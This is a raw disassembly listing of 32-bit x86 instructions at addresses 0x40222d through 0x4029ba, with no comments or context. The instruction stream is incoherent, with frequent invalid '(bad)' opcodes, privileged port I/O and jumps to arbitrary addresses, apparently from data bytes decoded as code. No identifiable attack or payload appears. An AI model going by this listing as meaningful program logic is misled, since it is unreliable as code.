  40222d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40222e:	xor    dh,BYTE PTR [ebx+eax*1-0x3a]
  402232:	cmp    DWORD PTR [ebx+0x22a59162],ecx
  402238:	pop    edi
  402239:	mov    ecx,0xc3278e75
  40223e:	sub    eax,DWORD PTR [edi+esi*2]
  402241:	ds mov edi,0xa69668a3
  402247:	rcr    BYTE PTR [esi],cl
  402249:	mov    bl,0xee
  40224b:	je     0x4021f3
  40224d:	arpl   WORD PTR [esi],cx
  40224f:	repz xchg edx,eax
  402251:	dec    esp
  402252:	shl    BYTE PTR [edi-0x72],cl
  402255:	test   DWORD PTR [eax-0x7f0c1cb8],edi
  40225b:	add    al,0xe2
  40225d:	sbb    DWORD PTR [edx-0xf793241],esi
  402263:	sub    DWORD PTR [edi+0x67],eax
  402266:	into   
  402267:	xor    BYTE PTR [esi+0x3e7cecdc],bh
  40226d:	outs   dx,DWORD PTR ds:[esi]
  40226e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40226f:	jle    0x40227f
  402271:	lds    eax,FWORD PTR [esi]
  402273:	lahf   
  402274:	mov    dh,0x61
  402276:	aam    0x18
  402278:	das    
  402279:	test   BYTE PTR [edi+0x38],dl
  40227c:	dec    edx
  40227d:	mov    ebp,0x6730d61f
  402282:	in     eax,dx
  402283:	aad    0x8b
  402285:	mov    al,0xfd
  402287:	lea    esi,[esi]
  402289:	ins    DWORD PTR es:[edi],dx
  40228a:	add    dh,BYTE PTR [ecx+eiz*1+0x74e7a7c]
  402291:	test   BYTE PTR [esi+0x1553ff50],0xbe
  402298:	push   es
  402299:	icebp  
  40229a:	xchg   ecx,eax
  40229b:	mov    dl,0x2e
  40229d:	dec    esi
  40229e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40229f:	ins    DWORD PTR es:[edi],dx
  4022a0:	imul   edi,edx,0x24
  4022a3:	sti    
  4022a4:	xor    BYTE PTR [ebp-0x66],bh
  4022a7:	stc    
  4022a8:	into   
  4022a9:	pop    es
  4022aa:	je     0x4022d2
  4022ac:	sahf   
  4022ad:	and    eax,0x13e7ff57
  4022b2:	test   BYTE PTR [ecx+0x12],bh
  4022b5:	xchg   ecx,eax
  4022b6:	fwait
  4022b7:	mov    edi,0xf48127aa
  4022bc:	mov    ds:0x2fbeb79f,al
  4022c1:	mov    cl,0x78
  4022c3:	call   0xe0fdd18
  4022c8:	ins    DWORD PTR es:[edi],dx
  4022c9:	mov    cl,0xb6
  4022cb:	add    ebp,DWORD PTR [ecx]
  4022cd:	(bad)  
  4022ce:	jmp    0x402334
  4022d0:	and    al,0x60
  4022d2:	or     eax,0x99fbb7ad
  4022d7:	xchg   ecx,eax
  4022d8:	mov    edi,0x582bfc7a
  4022dd:	nop
  4022de:	mov    ds:0xa6551dee,eax
  4022e3:	push   es
  4022e4:	xchg   ecx,eax
  4022e5:	mov    esi,DWORD PTR [ebx-0x7113c550]
  4022eb:	test   DWORD PTR [eax],ebx
  4022ed:	jb     0x402286
  4022ef:	sub    esi,DWORD PTR ds:0x6744d93a
  4022f5:	into   
  4022f6:	cmp    al,0xf7
  4022f8:	(bad)  
  4022f9:	cmp    DWORD PTR ds:0x1c6f98d2,esp
  4022ff:	jno    0x4022f2
  402301:	aad    0x39
  402303:	and    ch,BYTE PTR ds:0xf3992c2f
  402309:	scas   al,BYTE PTR es:[edi]
  40230a:	popa   
  40230b:	xlat   BYTE PTR ds:[ebx]
  40230c:	add    dl,BYTE PTR [edx-0x254b5e7]
  402312:	out    0xee,eax
  402314:	or     DWORD PTR [edi-0x46],ebx
  402317:	add    DWORD PTR [edx],esi
  402319:	lods   eax,DWORD PTR ds:[esi]
  40231a:	xor    eax,0x2c0a7e08
  40231f:	mov    edx,0x845aa727
  402324:	(bad)  
  402325:	ss jl  0x402348
  402328:	enter  0x6371,0x2e
  40232c:	and    ch,ch
  40232e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40232f:	pop    esi
  402330:	repnz in al,dx
  402332:	or     ecx,ecx
  402334:	push   eax
  402335:	pop    esp
  402336:	xchg   esp,eax
  402337:	pop    ss
  402338:	fbstp  TBYTE PTR [ebx+0x57]
  40233b:	add    BYTE PTR [ecx],dl
  40233d:	and    eax,0x873f2f96
  402342:	dec    edx
  402343:	add    edi,DWORD PTR [ebp+0x52fe5fe8]
  402349:	xchg   BYTE PTR [edx+0x4c91ab4d],dh
  40234f:	scas   eax,DWORD PTR es:[edi]
  402350:	sahf   
  402351:	push   esp
  402352:	cmp    DWORD PTR [ebp-0x299f65ca],esp
  402358:	setae  BYTE PTR [ebx]
  40235b:	jmp    0x2914381b
  402360:	das    
  402361:	in     al,0x1c
  402363:	out    dx,al
  402364:	fsub   st(3),st
  402366:	push   ebx
  402367:	ret    0x723c
  40236a:	ja     0x402369
  40236c:	jno    0x402361
  40236e:	(bad)  [eax+0x2a9c4bbc]
  402374:	aam    0x11
  402376:	adc    esi,ecx
  402378:	push   ebp
  402379:	mov    cl,0x7a
  40237b:	push   edx
  40237c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40237d:	pop    ss
  40237e:	bound  esp,QWORD PTR [esi]
  402380:	(bad)  
  402381:	mov    cl,dl
  402383:	jno    0x402330
  402385:	in     al,dx
  402386:	xchg   edx,eax
  402387:	retf   0xbd9a
  40238a:	or     dh,BYTE PTR [edx+esi*2]
  40238d:	es push eax
  40238f:	mov    ds:0xf578e897,eax
  402394:	jge    0x402371
  402396:	out    0x6f,al
  402398:	add    esp,DWORD PTR [edi-0x6f]
  40239b:	cmp    BYTE PTR [ecx+ecx*1],0xea
  40239f:	cmp    bh,BYTE PTR [eax+edi*4]
  4023a2:	or     ebx,0xdc307136
  4023a8:	cmp    cl,BYTE PTR [ebp-0x39]
  4023ab:	addr16 pop ebp
  4023ad:	outs   dx,DWORD PTR ds:[esi]
  4023ae:	lods   al,BYTE PTR ds:[esi]
  4023af:	or     dh,BYTE PTR [edi+ebx*1+0x4f]
  4023b3:	rol    eax,1
  4023b5:	stos   BYTE PTR es:[edi],al
  4023b6:	out    0x5f,eax
  4023b8:	je     0x402366
  4023ba:	fwait
  4023bb:	sbb    BYTE PTR ds:0xa2abe291,cl
  4023c1:	adc    BYTE PTR [ebx-0x38],dh
  4023c4:	fidiv  DWORD PTR [esi-0x62032292]
  4023ca:	lea    ebp,[eax-0x58]
  4023cd:	lods   eax,DWORD PTR ds:[esi]
  4023ce:	fnstcw WORD PTR [edx]
  4023d0:	jmp    0x4023c4
  4023d2:	dec    esp
  4023d3:	je     0x402371
  4023d5:	repnz push esp
  4023d7:	push   ebp
  4023d8:	aas    
  4023d9:	test   WORD PTR [ecx+0x67],bp
  4023dd:	cmp    al,0x8f
  4023df:	adc    DWORD PTR [edi],edx
  4023e1:	les    eax,FWORD PTR [ecx-0x10]
  4023e4:	not    BYTE PTR [ecx]
  4023e6:	enter  0xabb4,0x6d
  4023ea:	dec    eax
  4023eb:	stos   DWORD PTR es:[edi],eax
  4023ec:	into   
  4023ed:	push   esi
  4023ee:	ror    DWORD PTR [ebp-0x49],cl
  4023f1:	add    eax,0xf1735264
  4023f6:	lods   al,BYTE PTR ds:[esi]
  4023f7:	rol    bl,0x38
  4023fa:	je     0x4023be
  4023fc:	test   al,0xe2
  4023fe:	icebp  
  4023ff:	xchg   ebp,eax
  402400:	inc    esp
  402401:	aad    0xf6
  402403:	in     eax,0x33
  402405:	addr16 sahf 
  402407:	js     0x4023f6
  402409:	sub    dl,dh
  40240b:	push   0x7e
  40240d:	(bad)  
  40240e:	xor    edi,DWORD PTR ss:[edx]
  402411:	aam    0xe1
  402413:	mov    cl,0x74
  402415:	repnz xor eax,0xded797bc
  40241b:	cmc    
  40241c:	ror    DWORD PTR [edi],cl
  40241e:	mov    cl,0xd0
  402420:	push   esp
  402421:	mov    edi,ebp
  402423:	into   
  402424:	mov    al,dl
  402426:	and    DWORD PTR [ebx],esi
  402428:	push   ss
  402429:	inc    ebx
  40242a:	mov    ch,BYTE PTR [ecx+0x75]
  40242d:	(bad)  
  40242e:	mov    DWORD PTR [edi+edx*1+0x4ef69f9b],edi
  402435:	xor    eax,0x1191cbb3
  40243a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40243b:	cmp    BYTE PTR [eax],0x47
  40243e:	and    al,0xb6
  402440:	loope  0x402425
  402442:	xchg   esi,eax
  402443:	pop    ss
  402444:	shr    BYTE PTR [edx-0x31],1
  402447:	add    eax,0xde9ea975
  40244c:	pop    edx
  40244d:	ds pop edi
  40244f:	mov    DWORD PTR gs:[ebp+0x68],eax
  402453:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402454:	or     ebp,ebp
  402456:	mov    al,ds:0x77bbd529
  40245b:	inc    edx
  40245c:	mov    ecx,0x1d92db07
  402461:	adc    ch,dh
  402463:	out    dx,eax
  402464:	ss call esp
  402467:	adc    DWORD PTR [esi-0x41111039],esi
  40246d:	mov    dh,BYTE PTR [esi+0x61037a59]
  402473:	mov    edx,0x63671f3d
  402478:	jbe    0x4024c8
  40247a:	dec    ecx
  40247b:	stos   DWORD PTR es:[edi],eax
  40247c:	rcr    BYTE PTR [ebx+0x487d1444],1
  402482:	xor    ebp,DWORD PTR [ebx+0x15]
  402485:	bound  edx,QWORD PTR [ecx]
  402487:	mov    bh,0x63
  402489:	retf   
  40248a:	mov    eax,ds:0x52d7d45a
  40248f:	adc    BYTE PTR [edx+0x7f3a5787],bl
  402495:	sub    ch,dh
  402497:	pop    eax
  402498:	push   ecx
  402499:	push   ds
  40249a:	repz cwde 
  40249c:	pop    ss
  40249d:	pushf  
  40249e:	mov    ebx,0x875eaffb
  4024a3:	ret    
  4024a4:	push   ds
  4024a5:	mov    esp,0xae432981
  4024aa:	popa   
  4024ab:	cmp    eax,0xdbea5ce6
  4024b0:	test   al,0x99
  4024b2:	jno    0x402495
  4024b4:	jge    0x40251b
  4024b6:	(bad)  
  4024b7:	aaa    
  4024b8:	hlt    
  4024b9:	bound  esi,QWORD PTR [esi]
  4024bb:	inc    edx
  4024bc:	std    
  4024bd:	neg    DWORD PTR [edi+0x53b509e7]
  4024c3:	aad    0xbc
  4024c5:	jmp    DWORD PTR [esi]
  4024c7:	jb     0x402532
  4024c9:	sahf   
  4024ca:	mov    edi,0x97128b8
  4024cf:	pop    edi
  4024d0:	jg     0x4024e9
  4024d2:	cmp    eax,0x976acb12
  4024d7:	cmp    esi,0x9bc3161b
  4024dd:	add    edx,DWORD PTR [ecx-0x5d383447]
  4024e3:	(bad)  
  4024e4:	lock psubq mm0,QWORD PTR [esi]
  4024e8:	gs dec eax
  4024ea:	iret   
  4024eb:	sahf   
  4024ec:	aaa    
  4024ed:	or     esi,DWORD PTR [esi-0xd9cdb9]
  4024f3:	xlat   BYTE PTR ds:[ebx]
  4024f4:	sbb    eax,0xc03b7da4
  4024f9:	jo     0x40250c
  4024fb:	aaa    
  4024fc:	lock xor BYTE PTR [edx-0x4c8e78f0],ch
  402503:	sbb    BYTE PTR [ebx+edi*4],0x90
  402507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402508:	and    esp,DWORD PTR [esi+0xad89a23]
  40250e:	xchg   esp,eax
  40250f:	mov    edx,0x67f17862
  402514:	fs clc 
  402516:	call   0xa1aa6ccf
  40251b:	add    dh,cl
  40251d:	mov    cl,0x19
  40251f:	pop    edx
  402520:	adc    edx,DWORD PTR [ecx-0x14]
  402523:	loopne 0x402553
  402525:	jmp    0x49ce135e
  40252a:	xchg   edx,eax
  40252b:	xchg   esp,eax
  40252c:	and    BYTE PTR [edi-0x2e355303],0x86
  402533:	aas    
  402534:	test   al,0xa4
  402536:	test   DWORD PTR [ecx+0x4a],ecx
  402539:	jp     0x402508
  40253b:	mov    ds:0x9d9347f6,al
  402540:	dec    eax
  402541:	out    dx,eax
  402542:	xor    al,0x5
  402544:	add    DWORD PTR [esi],ebx
  402546:	cmp    DWORD PTR [edi],esi
  402548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402549:	mov    ebp,0x1502a19
  40254e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40254f:	fdivrp st(0),st
  402551:	pop    esi
  402552:	js     0x4025ca
  402554:	pop    edi
  402555:	cmp    ecx,DWORD PTR [ebx]
  402557:	into   
  402558:	fstp   QWORD PTR [ecx+0x77]
  40255b:	cmp    eax,0xe9c3991b
  402560:	xor    DWORD PTR [edx+ebx*2],ebp
  402563:	fadd   QWORD PTR [ebp+0x690be90b]
  402569:	or     dh,BYTE PTR [ebx]
  40256b:	and    eax,0x7f25b9f0
  402570:	in     al,0x1f
  402572:	adc    ch,BYTE PTR [eax-0x73babfb6]
  402578:	sub    edi,DWORD PTR [ebp+0x4d]
  40257b:	or     DWORD PTR [edx],ecx
  40257d:	ja     0x40257d
  40257f:	mov    ds:0xddb6b103,eax
  402584:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402585:	sbb    al,0x45
  402587:	outs   dx,DWORD PTR ds:[esi]
  402588:	and    bl,dl
  40258a:	and    al,0xe2
  40258c:	pop    ebp
  40258d:	cmp    cl,BYTE PTR [ebx-0x77]
  402590:	mov    esp,0x816a2623
  402595:	jae    0x4025d3
  402597:	daa    
  402598:	out    dx,eax
  402599:	inc    ecx
  40259a:	jl     0x402563
  40259c:	inc    esp
  40259d:	ins    BYTE PTR es:[edi],dx
  40259e:	push   es
  40259f:	fisub  DWORD PTR [esi-0x9]
  4025a2:	adc    ecx,DWORD PTR [esi-0x6dc568c8]
  4025a8:	push   esp
  4025a9:	dec    edi
  4025aa:	push   edx
  4025ab:	mov    esp,0x473e80a
  4025b0:	ds imul edx,eax,0xffffffc1
  4025b4:	jae    0x402539
  4025b6:	mov    WORD PTR [ebx],es
  4025b8:	adc    DWORD PTR [ecx-0x15],ecx
  4025bb:	add    al,bh
  4025bd:	nop
  4025be:	sub    DWORD PTR [eax+0x447f4061],edi
  4025c4:	cdq    
  4025c5:	sub    DWORD PTR [edi+0x519433f8],ebp
  4025cb:	aas    
  4025cc:	(bad)  [eax]
  4025ce:	mov    BYTE PTR [eax+0x778f6047],al
  4025d4:	and    BYTE PTR [ebp-0x26d03ba1],ah
  4025da:	mov    ecx,0x841dd3c1
  4025df:	call   0xe394005d
  4025e4:	xchg   esi,eax
  4025e5:	adc    eax,0x746857c3
  4025ea:	sti    
  4025eb:	dec    eax
  4025ec:	fbstp  TBYTE PTR [esi+0x11]
  4025ef:	mov    ecx,0x4b01592b
  4025f4:	nop
  4025f5:	(bad)  
  4025f6:	pusha  
  4025f7:	push   ebx
  4025f8:	jecxz  0x4025c6
  4025fa:	xor    DWORD PTR [edx+edi*8],ebx
  4025fd:	jne    0x4025ca
  4025ff:	dec    ecx
  402600:	dec    ebp
  402601:	jbe    0x402619
  402603:	lahf   
  402604:	jne    0x40264c
  402606:	fs sbb eax,0x115fe5ea
  40260c:	ins    BYTE PTR es:[edi],dx
  40260d:	sahf   
  40260e:	(bad)  
  40260f:	pop    ebp
  402610:	inc    eax
  402611:	aaa    
  402612:	or     al,0x90
  402614:	push   0xffffffaa
  402616:	fsubr  DWORD PTR [edx+0x27]
  402619:	lods   al,BYTE PTR ds:[esi]
  40261a:	sub    ecx,ebx
  40261c:	in     al,0x44
  40261e:	dec    eax
  40261f:	jp     0x402662
  402621:	ss retf 
  402623:	scas   eax,DWORD PTR es:[edi]
  402624:	clc    
  402625:	mov    ebp,0xa98573a8
  40262a:	xchg   edx,eax
  40262b:	push   ss
  40262c:	aad    0x5b
  40262e:	shl    DWORD PTR [ebx+esi*4+0x64b10987],0x48
  402636:	xor    eax,0x540529c6
  40263b:	fs inc esp
  40263d:	adc    DWORD PTR [esp+ecx*2-0x2f],0xffffffcb
  402642:	stos   DWORD PTR es:[edi],eax
  402643:	inc    ebx
  402644:	mov    edi,0xe76645a2
  402649:	imul   ebp,DWORD PTR [ebx-0xf],0x4ae93e2f
  402650:	mov    ebx,0x7fb02917
  402655:	popa   
  402656:	fsqrt  
  402658:	fs out 0x2f,al
  40265b:	adc    DWORD PTR ds:0xadd86be9,0xfffffff3
  402662:	sub    ah,BYTE PTR [edx+0x9e74b48]
  402668:	cmc    
  402669:	std    
  40266a:	xor    al,0x20
  40266c:	and    al,0x2
  40266e:	in     al,0x9e
  402670:	rcl    BYTE PTR [edx+0x30],0xa6
  402674:	pop    ecx
  402675:	cmp    esp,DWORD PTR [edi]
  402677:	or     DWORD PTR [edx-0x19a55167],eax
  40267d:	pop    edx
  40267e:	adc    dl,BYTE PTR [ebx+ebx*2-0x1965c3fc]
  402685:	push   esi
  402686:	push   esp
  402687:	xor    ah,BYTE PTR [ebx]
  402689:	push   ecx
  40268a:	aaa    
  40268b:	test   DWORD PTR [ecx-0x36],ecx
  40268e:	loop   0x4026fc
  402690:	ds loope 0x402700
  402693:	in     eax,0xff
  402695:	retf   0xe7
  402698:	bound  edi,QWORD PTR [edx]
  40269a:	sub    eax,DWORD PTR [ebp-0x1685f4e9]
  4026a0:	ins    DWORD PTR es:[edi],dx
  4026a1:	aad    0xfd
  4026a3:	sbb    DWORD PTR [eax+0x790e6a6],0x6bfa5c0
  4026ad:	xor    al,0xf5
  4026af:	cmp    eax,0xa0b45976
  4026b4:	retf   
  4026b5:	xlat   BYTE PTR ds:[ebx]
  4026b6:	xor    bh,BYTE PTR [edi+0x6c95fbdb]
  4026bc:	jge    0x4026d1
  4026be:	cli    
  4026bf:	cmc    
  4026c0:	aaa    
  4026c1:	pushf  
  4026c2:	xor    ah,0xe4
  4026c5:	mov    eax,ds:0x570fe385
  4026ca:	mov    bh,0xd3
  4026cc:	outs   dx,DWORD PTR ds:[esi]
  4026cd:	xor    esi,DWORD PTR [ebx+0x5]
  4026d0:	dec    ecx
  4026d1:	jae    0x4026cf
  4026d3:	xlat   BYTE PTR ds:[ebx]
  4026d4:	cmp    DWORD PTR [ebp-0x64],ebx
  4026d7:	jg     0x4026cd
  4026d9:	mov    cl,0x36
  4026db:	add    DWORD PTR [edi+0x591f65b3],edx
  4026e1:	repz fisubr DWORD PTR [ebx+eiz*4+0x76]
  4026e6:	pop    esi
  4026e7:	pop    edi
  4026e8:	(bad)  
  4026e9:	and    cl,ch
  4026eb:	mov    al,ds:0x2ab14496
  4026f0:	inc    ebp
  4026f1:	or     BYTE PTR [edx+0x72],bh
  4026f4:	(bad)  
  4026f5:	sub    BYTE PTR [edi+0x3f],ch
  4026f8:	sub    al,0xf
  4026fa:	push   edi
  4026fb:	popa   
  4026fc:	jo     0x4026d2
  4026fe:	lods   eax,DWORD PTR ds:[esi]
  4026ff:	mov    ch,al
  402701:	push   cs
  402702:	xchg   BYTE PTR [eax+0x2f980e8a],ah
  402708:	sub    eax,0xc22f11db
  40270d:	int    0xc3
  40270f:	ins    BYTE PTR es:[edi],dx
  402710:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402711:	mov    ch,0x7c
  402713:	add    edi,DWORD PTR [ebx-0x25]
  402716:	pop    esp
  402717:	rcl    cl,1
  402719:	jnp    0x40276d
  40271b:	push   ebp
  40271c:	loopne 0x4026c9
  40271e:	mov    al,ds:0x357f1fb9
  402723:	es neg ebp
  402726:	stc    
  402727:	adc    bl,bh
  402729:	add    DWORD PTR [ebx+esi*2],ecx
  40272c:	jne    0x402779
  40272e:	pop    ecx
  40272f:	mov    al,ds:0xc36aeb7c
  402734:	sbb    BYTE PTR [eax],dl
  402736:	loope  0x40274d
  402738:	push   0x34
  40273a:	inc    ebx
  40273b:	stc    
  40273c:	jne    0x402770
  40273e:	sub    dl,BYTE PTR [ebx]
  402740:	sub    dl,ch
  402742:	xchg   BYTE PTR [esi+0x49],bh
  402745:	in     eax,dx
  402746:	retf   0x79d1
  402749:	loop   0x4027c5
  40274b:	pop    edi
  40274c:	fdivr  DWORD PTR ds:0x4af74fa1
  402752:	dec    eax
  402753:	nop
  402754:	cmp    DWORD PTR [ebx-0x6712595f],esp
  40275a:	mov    ah,BYTE PTR [ebx-0x28]
  40275d:	data16 xor bh,BYTE PTR [edi]
  402760:	hlt    
  402761:	and    DWORD PTR [esp+ebx*8],esi
  402764:	fstp   TBYTE PTR [eax+0x1bd0659e]
  40276a:	imul   esp,eax,0x9d6ff10e
  402770:	mov    eax,ds:0xaf55107b
  402775:	enter  0xc0ac,0xd3
  402779:	push   edx
  40277a:	in     eax,dx
  40277b:	push   edx
  40277c:	mov    ?,WORD PTR [ebx+0x4]
  40277f:	in     eax,0x51
  402781:	sub    ecx,DWORD PTR [esi]
  402783:	and    eax,0x32d94288
  402788:	popa   
  402789:	stc    
  40278a:	xchg   ebp,eax
  40278b:	fsub   QWORD PTR [ecx-0x6c]
  40278e:	jmp    0x2f7cce5
  402793:	std    
  402794:	sbb    BYTE PTR [edi-0x6763e3f],ah
  40279a:	pop    esp
  40279b:	mov    DWORD PTR [esp+eax*2+0x4e],ebx
  40279f:	arpl   WORD PTR ds:0xde3cfa41,ax
  4027a5:	(bad)
  4027a9:	cmp    DWORD PTR [ecx-0x6c8f7970],0x679fab0f
  4027b3:	inc    esi
  4027b4:	aas    
  4027b5:	in     eax,dx
  4027b6:	add    al,0x94
  4027b8:	adc    ecx,DWORD PTR [esi-0x4754491b]
  4027be:	jo     0x40278b
  4027c0:	nop
  4027c1:	inc    esi
  4027c2:	dec    ebp
  4027c3:	fmul   DWORD PTR [esi]
  4027c5:	pop    ds
  4027c6:	je     0x4027ec
  4027c8:	jno    0x402806
  4027ca:	cli    
  4027cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027cc:	adc    eax,0xe6259eb6
  4027d1:	cmp    ch,ah
  4027d3:	test   BYTE PTR [edi],bh
  4027d5:	data16 das 
  4027d7:	mov    ch,0xaf
  4027d9:	lods   al,BYTE PTR ds:[esi]
  4027da:	les    edx,FWORD PTR [ecx-0x6b]
  4027dd:	loop   0x40276e
  4027df:	lahf   
  4027e0:	and    dh,BYTE PTR ds:0x4b1b174a
  4027e6:	outs   dx,BYTE PTR ds:[esi]
  4027e7:	inc    eax
  4027e8:	test   eax,0xfa65272
  4027ed:	jecxz  0x40286a
  4027ef:	pop    eax
  4027f0:	lods   eax,DWORD PTR ds:[esi]
  4027f1:	dec    edx
  4027f2:	jo     0x4027d6
  4027f4:	sbb    DWORD PTR [edx-0x4aa5a7a2],ebp
  4027fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4027fb:	(bad)  [ecx-0x62]
  4027fe:	stos   BYTE PTR es:[edi],al
  4027ff:	pop    eax
  402800:	fist   DWORD PTR [eax-0x6259f4a0]
  402806:	ins    DWORD PTR es:[edi],dx
  402807:	pop    edx
  402808:	fst    DWORD PTR [ebx+ebx*2]
  40280b:	inc    eax
  40280c:	sbb    eax,0xfa9c18a6
  402811:	ja     0x4027f7
  402813:	clc    
  402814:	sbb    al,0xb8
  402816:	push   0xffffffb9
  402818:	push   0xffffffd3
  40281a:	or     bh,dh
  40281c:	mov    ds:0xad6bc60,al
  402821:	shl    DWORD PTR [ebp+0xa],1
  402824:	stos   BYTE PTR es:[edi],al
  402825:	js     0x4027ac
  402827:	repnz pop ebx
  402829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40282a:	stc    
  40282b:	inc    edx
  40282c:	repnz out dx,al
  40282e:	bound  edi,QWORD PTR [ebx]
  402830:	in     eax,dx
  402831:	jp     0x402826
  402833:	jecxz  0x402812
  402835:	dec    edx
  402836:	stos   BYTE PTR es:[edi],al
  402837:	sbb    al,0x23
  402839:	mov    BYTE PTR [ecx],ah
  40283b:	icebp  
  40283c:	iret   
  40283d:	adc    eax,ecx
  40283f:	jno    0x402818
  402841:	push   0x80ee2c06
  402846:	jns    0x402833
  402848:	sub    ebp,edi
  40284a:	scas   al,BYTE PTR es:[edi]
  40284b:	push   0xffbc1055
  402850:	or     esi,edx
  402852:	pop    ebx
  402853:	popa   
  402854:	std    
  402855:	(bad)  
  402856:	out    dx,al
  402857:	xchg   edx,eax
  402858:	adc    ebp,ecx
  40285a:	enter  0xdcf9,0x2d
  40285e:	xchg   ebp,eax
  40285f:	mov    dl,0x5
  402861:	mov    ebx,ds
  402863:	pop    edi
  402864:	dec    ecx
  402865:	mov    WORD PTR [edi-0x4a],?
  402868:	jb     0x402827
  40286a:	inc    eax
  40286b:	jg     0x402803
  40286d:	mov    ch,0x3f
  40286f:	into   
  402870:	mov    bl,0x91
  402872:	(bad)  
  402873:	cmp    edx,DWORD PTR [esi+esi*2]
  402876:	or     BYTE PTR ds:0x3838d9c8,bh
  40287c:	fwait
  40287d:	shl    BYTE PTR [ebp+0x19],0x49
  402881:	iret   
  402882:	jb     0x402824
  402884:	mov    esi,DWORD PTR [ebp+0x479d2859]
  40288a:	outs   dx,BYTE PTR ds:[esi]
  40288b:	xor    eax,0x65ecb022
  402890:	jae    0x4028f3
  402892:	mov    al,ds:0x7c22f45d
  402897:	in     al,dx
  402898:	xor    al,cl
  40289a:	retf   0x2cd4
  40289d:	mov    dl,0xc6
  40289f:	inc    ecx
  4028a0:	cld    
  4028a1:	test   BYTE PTR [ebx],0xa4
  4028a4:	sub    ch,BYTE PTR [ecx]
  4028a6:	pop    ecx
  4028a7:	dec    ecx
  4028a8:	push   cs
  4028a9:	fucomip st,st(5)
  4028ab:	clc    
  4028ac:	xchg   edx,eax
  4028ad:	dec    ecx
  4028ae:	cdq    
  4028af:	ins    DWORD PTR es:[edi],dx
  4028b0:	leave  
  4028b1:	push   cs
  4028b2:	inc    esi
  4028b3:	add    dh,BYTE PTR [edi]
  4028b5:	sub    eax,DWORD PTR [edx-0x35]
  4028b8:	stos   BYTE PTR es:[edi],al
  4028b9:	jecxz  0x4028f3
  4028bb:	ins    DWORD PTR es:[edi],dx
  4028bc:	push   0x73
  4028be:	(bad)  
  4028bf:	aaa    
  4028c0:	stos   DWORD PTR es:[edi],eax
  4028c1:	and    ah,BYTE PTR [eax-0x28b97528]
  4028c7:	in     al,dx
  4028c8:	out    0xd2,eax
  4028ca:	test   bh,dh
  4028cc:	retf   0x5cc
  4028cf:	scas   al,BYTE PTR es:[edi]
  4028d0:	adc    BYTE PTR [ebx+ebx*4-0x7ce66874],dl
  4028d7:	sbb    DWORD PTR [esi],0xffffffa8
  4028da:	or     BYTE PTR [edi-0x2f],bh
  4028dd:	pop    es
  4028de:	ins    BYTE PTR es:[edi],dx
  4028df:	adc    dl,BYTE PTR [ecx-0x38]
  4028e2:	add    BYTE PTR [ecx+0x6c99eba0],0x0
  4028e9:	sub    bh,BYTE PTR ds:0x689c3c52
  4028ef:	je     0x402879
  4028f1:	out    dx,eax
  4028f2:	add    DWORD PTR [edi+0x57],ecx
  4028f5:	and    al,0x81
  4028f7:	ds inc ebp
  4028f9:	lea    esp,[ebx+0x1c]
  4028fc:	retf   0xb2fc
  4028ff:	cmp    eax,0x736be552
  402904:	adc    BYTE PTR [ecx],0xba
  402907:	(bad)  
  402908:	addr16 (bad) 
  40290a:	scas   al,BYTE PTR es:[edi]
  40290b:	mov    BYTE PTR [ebp+0x559ce74f],ah
  402911:	jns    0x402952
  402913:	lock aad 0x2
  402916:	cmp    eax,0xacbc4f9
  40291b:	in     eax,dx
  40291c:	push   cs
  40291d:	xor    BYTE PTR [edx-0x6a6c1b3],0xa0
  402924:	pop    ecx
  402925:	jl     0x402947
  402927:	inc    ebx
  402928:	sti    
  402929:	shr    BYTE PTR [ecx],0x70
  40292c:	xchg   esi,eax
  40292d:	cmp    eax,0xda51c0cd
  402932:	mov    dh,0x69
  402934:	and    ecx,DWORD PTR [ebx-0xc9ad8b3]
  40293a:	mov    dl,0x9e
  40293c:	pop    es
  40293d:	in     eax,0x8e
  40293f:	call   0x478572c5
  402944:	jmp    0x402910
  402946:	xor    edx,DWORD PTR [esp+eiz*8]
  402949:	loope  0x402946
  40294b:	fwait
  40294c:	ins    BYTE PTR es:[edi],dx
  40294d:	jmp    0x40295f
  40294f:	std    
  402950:	add    BYTE PTR [ebx-0x41],al
  402953:	inc    ecx
  402954:	pop    ds
  402955:	mov    dh,BYTE PTR ss:[esp+ecx*4]
  402959:	xor    edx,DWORD PTR [edx-0x1c]
  40295c:	add    esp,DWORD PTR ds:0x41b6dad5
  402962:	scas   eax,DWORD PTR es:[edi]
  402963:	dec    esi
  402964:	sahf   
  402965:	leave  
  402966:	or     al,0x30
  402968:	sub    BYTE PTR [ecx-0x28978f8],dh
  40296e:	leave  
  40296f:	xchg   esi,eax
  402970:	or     BYTE PTR [ecx+edx*1],ch
  402973:	jge    0x402922
  402975:	pop    esi
  402976:	push   esi
  402977:	mov    ebp,0x3c7c26e1
  40297c:	mov    esp,ebp
  40297e:	rcr    DWORD PTR [edx+0x9],cl
  402981:	in     al,0xcc
  402983:	mov    esi,edi
  402985:	mov    esp,0xda8e4539
  40298a:	das    
  40298b:	or     DWORD PTR [ebx+eiz*2],eax
  40298e:	xor    BYTE PTR [eax+0x54],bh
  402991:	dec    esp
  402992:	popa   
  402993:	ss pop edi
  402995:	loopne 0x402969
  402997:	push   es
  402998:	lock cmps BYTE PTR ds:[si],BYTE PTR es:[di]
  40299b:	or     ebp,edi
  40299d:	or     al,bh
  40299f:	inc    ebx
  4029a0:	jp     0x4029e9
  4029a2:	jecxz  0x402970
  4029a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029a5:	jo     0x402967
  4029a7:	mov    cl,0xe5
  4029a9:	push   ebx
  4029aa:	test   edi,0x12e0a25
  4029b0:	sub    dh,BYTE PTR [ecx]
  4029b2:	adc    eax,0x999879f8
  4029b7:	cs cwde 
  4029b9:	leave  
  4029ba:	into   
